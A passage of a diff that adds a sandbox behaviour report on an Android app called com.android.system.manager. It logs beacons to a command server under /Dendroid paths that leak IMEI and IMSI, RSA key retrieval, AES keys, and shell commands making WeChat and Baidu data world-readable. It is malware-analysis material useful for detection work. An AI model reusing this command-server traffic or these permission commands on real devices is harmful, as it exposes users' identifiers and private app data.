+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nPragma: No-cache\r\nCache-Control: no-cache\r\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Wed, 17 Oct 2018 07:41:21 GMT\r\n\r\n256\r\n{\"key\":\"30820122300d06092a864886f70d01010105000382010f003082010a02820101009b69ace14b59b9b7db8af27ad6e65daf1102fd334ec02379a0667dc4d3a1c83b193f9f0ac8acf7429810004bdc98387d779ee4ef448644f08f6f43e6a047ce198957c13c260680835783df86fbe7dba6dbe34736088f101d05dbb8b41cba71832f7bca506573e0abdfebfa13e3d83ce57d7d501786deaaeabfcc65bbb1691990d534792886a754a1bac040e2f51d4452302249fe61e0567d1edd17b4bfdc67fdbdc9ac56313bb6c8b1c44bab5a664922a77290ca71c1180443b3203449b603a7438fb724569226ee9bd97cce562cf0ca4c7850a336054616405728dcc19532f1212d427bf113751074f14d704df1c1eb663560e521b1ce429d8cccc80b76ac730203010001\"}\r\n0\r\n\r\n",
+                    "time": 5.49823,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705522928,
+                    "data": "dc5f4de171db64c109116883b51c4d0508d2aecf0930f0e7650bcdfea49d3ddc30",
+                    "time": 55.783252,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nstatus: success\r\nContent-Length: 74\r\nDate: Wed, 17 Oct 2018 07:41:39 GMT\r\n\r\n313bd00c",
+                    "time": 22.759921,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nstatus: success\r\nContent-Length: 74\r\nDate: Wed, 17 Oct 2018 07:41:49 GMT\r\n\r\nad7d2e88",
+                    "time": 33.816535,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705522928,
+                    "data": "a45de31f8e2c4ce1b021e380fa235768e0c0df792dc6562ed5e52608119d170a6d",
+                    "time": 33.835251,
+                    "srchost": "s2.upupdate.cn",
+                    "srcport": 8088,
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "sendnet": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 8629b08348b4b594372d8cb7c91727374f111111458e715cd42ae0efc80ca1ce9dc6302bb3e7840d6857a1385a804b96c93ceb02d3eb6bcc95db91538aaec43fa99a6d8772b0fa3e4909f6f9325662cfe12426552c5ff4e29712359e9246eb84db0df9d9c3fa389c855acabd549c7605bb8fa9c7836f191802e9f7172d5373a50786af90cd78b60f11ed76080d492418bee8af54ea7985256dbac8d07abe184f9bf4533b05cd9255bd00690d1bfb736de852f210e7cfa2268752dea21ffca9fa2567d4e5fcb1cb0ec6eba351434a9fcc1f81968e9fc9c12cd60d5ea3d13ebdbe9dde82cd0c6fa94a8d87ac27a0d60d13ccb83cff3724b576ef0955f711eb4bca\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n77cded10fe4445ae2a97739650502fdc3a7aedb2f69b0615684288dba3aeb91dbe1d3f913e2df278096f5ff57a7a2997beee2709953a2a47199f792821f062961b3b7985f4a447906999f99a8a3",
+                    "time": 55.287848,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 03c3226e5a9c79aac1544d8683782ee3ef5347ef34696c4da5c75eea3006520d53120f0fcb217dd8133c7e65afe719a97a0ac695b44867a2aad372f78304b82a12f0c1ce8fee3c5f981282886b483129db6fb5f7ee8b2e313eb2cd167d65b06c79064c6832927f84ac62914d4b2d93064b81c71abc67437981fb0032065d180ef1fd993915dc746b249d4c49f61838654bb6592e840467d9b736d118e6f800cec263afb7b01a129f5f1138c57cbb84a68b521797950bd5acedb278b77180980ba1cf67f4109b304a5501c3d08f3fb766e86e702f382467b95a8a630746a0f60ded3ec40b6c96318699fa4ec28a1167c8b471a600a9f6103b7ac543e355eb4161\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\nf0acfceb57e19b2e49d0775972692325bfbffebdef0ddbb4c89a42e370fe865739f0745a74af70c060a018328d28bce53de918ad8bb0d5b7837a6b6f3b19fba8630bf23defd3bd90df443362dda",
+                    "time": 11.004731,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705802416,
+                    "data": "GET /Dendroid/datacipher/getRsaKey HTTP/1.1\r\nHost: s2.upupdate.cn:8088\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nUser-Agent: okhttp/3.9.1\r\n\r\n",
+                    "time": 5.191467,
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 8a9dc91a26b36e6456c207698fd04f5ce0dabc5f57c27f08f1861996b6d00eeb67319e1438b20cd4e3fb1058dda520c65a7b37f8dbb23924abeaa667f72758a0fd15b6e0877606acc7e9014bfa755e5e31722bc0c9b242c293b00072edffa574326bcfe00c5226a3216cd6cb9efc94b8bea57aa10da820d01915dcbe0def946aec7fbae1a2d907890e80df85448d495938f3c09dbec9ea12737db434ad130be19de5e11eaecef0d318dcd7fd8bae0d3f37a974cb1c9e4d4688ed87a99bd23fb5855a25da7ae4424aa5f53e48b8fe483f41799523627bff736b7cc59a2cbb8e7311cd6e4da27b082d241b498ad2aba97b7128d4d86e2f8cd8ae50da362530edc8\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n417e6a46f8a1dbc98d4e07197d89f7d636653818bba44d601dc494297117bb1fd05ef7249d6e7d1748cde814f3b58954d543d41c790207dc0b3d524f284de156f0f584ee086f3a8f1a2b736d81c",
+                    "time": 44.211769,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 5c995b68d025281cfef5bd924bd1244c58cd2b2e1369e3271280305a79fe922d48f90044ba23e57112d833f5e37be1301d38f1d0ea6a512dd3e3abc7f0bf69d1d3faf3e6efc35dca8be8d735281e366fd3c091d5b61add3840ff454a20f28a3662a84228b9203d95f5f7691bc3bae4d842779d72966341317ff8cede9b02dd2720d332c205fc8c003f06a6b5788cbaa7f44116c2bfb42156e93f3bf7327f6e2418c1e2638b0784600d4ec85ce99364c98b4d628546dc228bb03afb05028c9c737a0fcf37b7e2e4cc915e1d065f750c78ea929a045eee0c8dc304df4137096e19c824c2f0441ae9025dfa3c95d036f10e512e6d73cafb01769f2d45c39d64cee0\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\n313bcd170d24ecb8e8e5f7dcdebb56e40ba55fa9f56fc20ab898dd591526c13d71c7ecfae4a7a2dcbb160ddd5b0111ed2243a3f5eaddfce3b51be3eff92c9ddb97663b4d0da73a09e65cd5af9cf",
+                    "time": 22.077494,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "POST /Dendroid/commandManager/getCommand HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: text/json\r\ncharset: UTF-8\r\nCache-Control: no-cache\r\narg0: 4e6931359d6b14b3de1ac4537d0e2b8c60d2a691285d369fed4946d7d5e425117ffe3d0946b8d5d21507eb2a7b6968d1d90652f1428b729c9bc5a04f936b047e343670f4cabe73b575e74738b074bf1c09755bc81e771d7db3e01d512d3d7fdf373f50c5e1300a56183f2f714f3d08ebdba43b498a96898f51b88bb0a41dc65f5679abea9f5d2a441e40b8726c5c6d417064e2b5d1e6a76fc7b961794bffae9a2f31823c188b5a2edfec35451c9729d5f9fc2f0001245dbea885e8e2ac2ab68b9a4065d90436c6a5417efa7b6cbb16f7ccb6559f0f5723f890a9ae68db4261a8a47251959adf0ca8a4b15988b1c5e695d6ebc1300f4036ba5fd7737fdd250788\r\narg1: f4fd466ca29f7610e6f77046ace9ca15\r\narg2: 3.03\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: s2.upupdate.cn:8088\r\nAccept-Encoding: gzip\r\nContent-Length: 500\r\n\r\nad7d33938646eb50d5605bb6e960a4dff654d5552f5acb8387ad5bebbb8c48306df561e480cce25a20b345601e7f4affe9d361d90ce547b83b890950745d68f58adc4e22ef3acf98db604a59c04",
+                    "time": 33.214969,
+                    "dataleak": [
+                        "TAINT_IMEI",
+                        "TAINT_IMSI"
+                    ],
+                    "desthost": "s2.upupdate.cn",
+                    "destport": 8088,
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "sendsms": [],
+            "dexclass": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.android.system.manager-1.apk",
+                    "time": 0.203247,
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "\n",
+                    "name": "pipe:[2774]",
+                    "time": 0.97467,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "\n",
+                    "name": "pipe:[2764]",
+                    "time": 0.904722,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "0751c609557d3187e2b6bd86b59b9d90f0493f03",
+                    "name": "/dev/urandom",
+                    "time": 32.863559,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "\n",
+                    "name": "pipe:[2769]",
+                    "time": 0.944772,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "2b6149f6ee9b871b5afdb4cb4ac14a825d6280f2",
+                    "name": "/dev/urandom",
+                    "time": 54.965237,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "\n",
+                    "name": "pipe:[2779]",
+                    "time": 1.003678,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "504b0506000000001200120033050000919e03000000504b01021400140008080800f2800d4db1db76b063020000150500001400040000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46feca0000504b01021400140008080800f2800d4d861a1edb950200004a0500001000000000000000000000000000a90200004d4554412d494e462f434552542e5346504b01021400140008080800f2800d4da5f67dbb82040000b206000011000000000000000000000000007c0500004d4554412d494e462f434552542e525341504b01021400140008080800f2800d4d191e830a7f0900009c27000013000000000000000000000000003d0a0000416e64726f69644d616e69666573742e786d6c504b01020a000a00000800000040210062df48f24c1700004c1700002400000000000000000000000000fd1300007265732f6472617761626c652d686470692d76342f69635f6c61756e636865722e706e67504b01021400140008080800f2800d4d55e0da58cd0000006c0100001c000000000000000000000000008b2b00007265732f6c61796f75742f61637469766974795f6d61696e2e786d6c504b01020a000a000008000000402100d9df846a280c0000280c00002400000000000000000000000000a22c00007265732f6472617761626c652d6d6470692d76342f69635f6c61756e",
+                    "name": "/data/app/com.android.system.manager-1.apk",
+                    "time": 0.261551,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "\n",
+                    "name": "pipe:[2784]",
+                    "time": 1.033504,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "0f0e94adf4b5495d988bb0454958232a38be959b36763e1b02f448df57991c424e01e0f4144c546a",
+                    "name": "/dev/urandom",
+                    "time": 10.634267,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "2efd4b72636c3ee106844e29da4d9785ffcb505b",
+                    "name": "/dev/urandom",
+                    "time": 21.715631,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "9c060b10b450dd49bf6c9f5239213b175577bcd1",
+                    "name": "/dev/urandom",
+                    "time": 43.903906,
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "ADA527BAAB5F0BBE",
+                    "time": 10.70262,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "65, 68, 65, 53, 50, 55, 66, 65, 65, 66, 53, 70, 48, 66, 66, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 10.716589,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "65, 68, 65, 53, 50, 55, 66, 65, 65, 66, 53, 70, 48, 66, 66, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 11.693599,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "2BE01F9D5336E3FA",
+                    "time": 21.740407,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "50, 66, 69, 48, 49, 70, 57, 68, 53, 51, 51, 54, 69, 51, 70, 65",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 21.757768,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "50, 66, 69, 48, 49, 70, 57, 68, 53, 51, 51, 54, 69, 51, 70, 65",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 22.855985,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "911CF56B89E1EBAE",
+                    "time": 32.883241,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "57, 49, 49, 67, 70, 53, 54, 66, 56, 57, 69, 49, 69, 66, 65, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 32.900839,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "57, 49, 49, 67, 70, 53, 54, 66, 56, 57, 69, 49, 69, 66, 65, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 33.874993,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "250191F42862780E",
+                    "time": 43.922048,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "50, 53, 48, 49, 57, 49, 70, 52, 50, 56, 54, 50, 55, 56, 48, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 43.937659,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "50, 53, 48, 49, 57, 49, 70, 52, 50, 56, 54, 50, 55, 56, 48, 69",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 44.954926,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "8FD3A9F9AC9DAEA4",
+                    "time": 54.989066,
+                    "algorithm": "RSA/ECB/PKCS1Padding",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "56, 70, 68, 51, 65, 57, 70, 57, 65, 67, 57, 68, 65, 69, 65, 52",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 55.00674,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "key": "56, 70, 68, 51, 65, 57, 70, 57, 65, 67, 57, 68, 65, 69, 65, 52",
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "time": 55.825042,
+                    "algorithm": "AES",
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "fileswritten": [
+                {
+                    "pid": 846,
+                    "tid": 705802416,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<string name=\"key\">30820122300d06092a864886f70d01010105000382010f003082010a02820101009b69ace14b59b9b7db8af27ad6e65daf1102fd334ec02379a0667dc4d3a1c83b193f9f0ac8acf7429810004bdc98387d779ee4ef448644f08f6f43e6a047ce198957c13c260680835783df86fbe7dba6dbe34736088f101d05dbb8b41cba71832f7bca506573e0abdfebfa13e3d83ce57d7d501786deaaeabfcc65bbb1691990d534792886a754a1bac040e2f51d4452302249fe61e0567d1edd17b4bfdc67fdbdc9ac56313bb6c8b1c44bab5a664922a77290ca71c1180443b3203449b603a7438fb724569226ee9bd97cce562cf0ca4c7850a336054616405728dcc19532f1212d427bf113751074f14d704df1c1eb663560e521b1ce429d8cccc80b76ac730203010001</string>\n</map>\n",
+                    "name": "/data/data/com.android.system.manager/shared_prefs/PublicKey.xml",
+                    "time": 5.555176,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705502920,
+                    "data": "chmod -R 777 /data/data/com.baidu.searchbox\nexit\n",
+                    "name": "pipe:[2807]",
+                    "time": 3.844676,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705615440,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"wifi_sleep_policy\" value=\"0\" />\n</map>\n",
+                    "name": "/data/data/com.android.system.manager/shared_prefs/wifi_sleep_policy.xml",
+                    "time": 0.753112,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<boolean name=\"isFirst\" value=\"true\" />\n</map>\n",
+                    "name": "/data/data/com.android.system.manager/shared_prefs/isFirst.xml",
+                    "time": 0.608991,
+                    "processname": "com.android.system.manager"
+                },
+                {
+                    "pid": 846,
+                    "tid": 705502920,
+                    "data": "chmod -R 777 /data/data/com.tencent.mm/\nexit\n",
+                    "name": "pipe:[2793]",
+                    "time": 3.202195,
+                    "processname": "com.android.system.manager"
+                }
+            ],
+            "servicestart": [
+                {
+                    "pid": 846,
+                    "tid": 1073870640,
+                    "name": "com.android.system.manager.BaseNotificationListener",
+                    "time": 0.72099,
+                    "processname": "com.android.system.manager"
+                }
+            ]
+        }
+    }
+}
